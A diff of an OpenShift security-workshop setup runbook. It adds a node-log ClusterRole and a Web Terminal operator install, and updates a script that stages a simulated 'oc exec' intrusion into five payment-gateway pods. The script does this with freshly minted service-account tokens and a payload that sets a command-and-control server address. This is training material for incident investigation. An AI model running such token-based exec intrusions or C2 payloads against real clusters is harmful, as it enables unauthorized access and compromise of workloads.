@@ -90,11 +90,40 @@ consolenotification.console.openshift.io/acme-banner created
 #+end_example
 
 
+* Create a cluster role for viewing node logs
+
+During the workshop participants are going to query node logs with ~oc adm~.  We need to create a cluster role that will allow this.
+
+#+NAME: Create node log view cluster role
+#+begin_src bash
+cat << EOF | oc apply --filename -
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: node-log-viewer
+rules:
+  - apiGroups: [""]
+    resources:
+      - "nodes/log"
+      - "nodes/proxy"
+      - "nodes"
+    verbs: ["get", "list"]
+EOF
+#+end_src
+
+#+RESULTS: Create node log view cluster role
+#+begin_example
+clusterrole.rbac.authorization.k8s.io/node-log-viewer configured
+#+end_example
+
+
 * Deploy compromised workloads
 
 For the purposes of exercise 2 we need an existing project and demo workload for each workshop user.
 
 We'll create the required ~Project~, ~Pod~ and ~ServiceAccount~ by hydrating an OpenShift ~Template~, then carry out the exploit with a bash script once the pods are up.
+
+The ~setup/app-template.yaml~ file also handles the various permissions each workshop attendee requires.
 
 #+NAME: Deploy compromised workloads
 #+begin_src bash
@@ -110,9 +139,13 @@ echo "Simulating live 'oc exec' intrusion across environments..."
 for i in $(seq 1 5); do
   namespace="payment-gateway-$i"
 
+  # Request a short lived token for our new cicd service account in this namespace
+  token=$(oc create token cicd-pipeline-runner-sa --namespace "${namespace}")
+
   # Executing the exploit payload dynamically using explicit parameter names
   oc exec pod/payment-gateway \
     --namespace "${namespace}" \
+    --token "${token}" \
     --container httpd \
     -- sh -c '
       export C2_SERVER="198.51.100.42"
@@ -133,39 +166,44 @@ done
 Applying template for each attendee
 project.project.openshift.io/payment-gateway-1 unchanged
 pod/payment-gateway unchanged
-serviceaccount/workshop-sa unchanged
+serviceaccount/cicd-pipeline-runner-sa unchanged
 rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
 role.rbac.authorization.k8s.io/container-executor unchanged
 rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-1 unchanged
 project.project.openshift.io/payment-gateway-2 unchanged
 pod/payment-gateway unchanged
-serviceaccount/workshop-sa unchanged
+serviceaccount/cicd-pipeline-runner-sa unchanged
 rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
 role.rbac.authorization.k8s.io/container-executor unchanged
 rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-2 unchanged
 project.project.openshift.io/payment-gateway-3 unchanged
 pod/payment-gateway unchanged
-serviceaccount/workshop-sa unchanged
+serviceaccount/cicd-pipeline-runner-sa unchanged
 rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
 role.rbac.authorization.k8s.io/container-executor unchanged
 rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-3 unchanged
 project.project.openshift.io/payment-gateway-4 unchanged
 pod/payment-gateway unchanged
-serviceaccount/workshop-sa unchanged
+serviceaccount/cicd-pipeline-runner-sa unchanged
 rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
 role.rbac.authorization.k8s.io/container-executor unchanged
 rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-4 unchanged
 project.project.openshift.io/payment-gateway-5 unchanged
 pod/payment-gateway unchanged
-serviceaccount/workshop-sa unchanged
+serviceaccount/cicd-pipeline-runner-sa unchanged
 rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
 role.rbac.authorization.k8s.io/container-executor unchanged
 rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding created
+rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
+clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-5 unchanged
 Waiting for all payment-gateway pods to initialize...
 pod/payment-gateway condition met
 pod/payment-gateway condition met
@@ -178,6 +216,33 @@ Simulating live 'oc exec' intrusion across environments...
 [+] Namespace payment-gateway-3 weaponized via simulated session execution.
 [+] Namespace payment-gateway-4 weaponized via simulated session execution.
 [+] Namespace payment-gateway-5 weaponized via simulated session execution.
+#+end_example
+
+
+* Install web terminal operator
+
+Participants are going to use the OpenShift Web Terminal to run commands in order to avoid having to do anything locally on their devices.
+
+#+NAME: Install openshift web terminal
+#+begin_src bash
+cat << EOF | oc apply --filename -
+apiVersion: operators.coreos.com/v1alpha1
+kind: Subscription
+metadata:
+  name: web-terminal
+  namespace: openshift-operators
+spec:
+  channel: fast
+  installPlanApproval: Automatic
+  name: web-terminal
+  source: redhat-operators
+  sourceNamespace: openshift-marketplace
+EOF
+#+end_src
+
+#+RESULTS: Install openshift web terminal
+#+begin_example
+subscription.operators.coreos.com/web-terminal created
 #+end_example
 
 
